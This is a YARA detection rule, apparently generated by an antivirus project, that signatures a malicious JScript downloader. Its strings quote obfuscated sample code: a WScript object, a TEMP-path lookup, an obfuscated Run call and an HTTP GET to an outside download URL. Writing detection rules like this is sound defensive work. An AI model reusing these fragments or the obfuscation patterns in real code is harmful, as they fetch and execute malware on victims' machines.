rule sig_20160428_2b75bf2e9d5fd1fc9bc828572bebae62 {
  meta:
    description = "datamaliciousorder - file 20160428_2b75bf2e9d5fd1fc9bc828572bebae62.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "14784e117bdccb76dc39c205a2fcd44067a4ed941cd40e74118f3fc8c6fe0f54"

  strings:
    $s1  = "PbnQwvKbnQjqJbtLiaFpi[PznNjyRdgRyyRysYbkKhf](\"G\" + \"ET\", \"http://switchright.com/2yshda\", false);" fullword ascii
    $s2  = "function RunGahGfnBsuAvnElfNog() {return OpnKihDdsVoqTpdOnwRdi[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function KlxQfmRtfMdsOacGcmIir(QdgUjsVtrAkbOqjGneLoq){OpnKihDdsVoqTpdOnwRdi[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function KlxQfmRtfMdsOacGcmIir(QdgUjsVtrAkbOqjGneLoq){OpnKihDdsVoqTpdOnwRdi[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s5  = "function TqmKhhFcvXsvFwhNakRez(TxkJtgBpcHgcTgrVbpCdk, FsnSdwIfwAzqTahZemRgd){QbuCjwCioTyrYjiExdRjw = QbuCjwCioTyrYjiExdRjw * 1; " ascii
    $s6  = "function RunGahGfnBsuAvnElfNog() {return OpnKihDdsVoqTpdOnwRdi[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s7  = "return TxkJtgBpcHgcTgrVbpCdk - FsnSdwIfwAzqTahZemRgd;};" fullword ascii
    $s8  = "if (PbnQwvKbnQjqJbtLiaFpi[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "var OpnKihDdsVoqTpdOnwRdi = function NjdKgzWqaCjgQmkHdvQqq() {return MxuZsaDgaWriCaqLtqHhd[SpwSnyRidNqgOanSdhOvv](\"WScript\"+\"" ascii
    $s10 = "function LunBkgEqzBdrAeqOzgXfl(){return CwrLhqSsoMbtVsdSohVpd + \"\";};" fullword ascii
    $s11 = "function TqmKhhFcvXsvFwhNakRez(TxkJtgBpcHgcTgrVbpCdk, FsnSdwIfwAzqTahZemRgd){QbuCjwCioTyrYjiExdRjw = QbuCjwCioTyrYjiExdRjw * 1; " ascii
    $s12 = "function ReoDxzOktOxdAotBdkRuy() {return ((TlrSwuXagWaaDrvMyfYwy == true) && (TlrSwuXagWaaDrvMyfYwy == UaxVnbMrsVgbIteOwrCbk)) ?" ascii
    $s13 = "function ReoDxzOktOxdAotBdkRuy() {return ((TlrSwuXagWaaDrvMyfYwy == true) && (TlrSwuXagWaaDrvMyfYwy == UaxVnbMrsVgbIteOwrCbk)) ?" ascii
    $s14 = "var MxuZsaDgaWriCaqLtqHhd = this[\"WScript\"];" fullword ascii
    $s15 = "var OpnKihDdsVoqTpdOnwRdi = function NjdKgzWqaCjgQmkHdvQqq() {return MxuZsaDgaWriCaqLtqHhd[SpwSnyRidNqgOanSdhOvv](\"WScript\"+\"" ascii
    $s16 = "var TlrSwuXagWaaDrvMyfYwy = false;" fullword ascii
    $s17 = "function XwjOnhTzpQklPemArwLcp(){return SpwSnyRidNqgOanSdhOvv;};" fullword ascii
    $s18 = "function RbaVxtGtrMheDinRzzBdx(){return 23;};" fullword ascii
    $s19 = "var UaxVnbMrsVgbIteOwrCbk = false;" fullword ascii
    $s20 = "TlrSwuXagWaaDrvMyfYwy = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}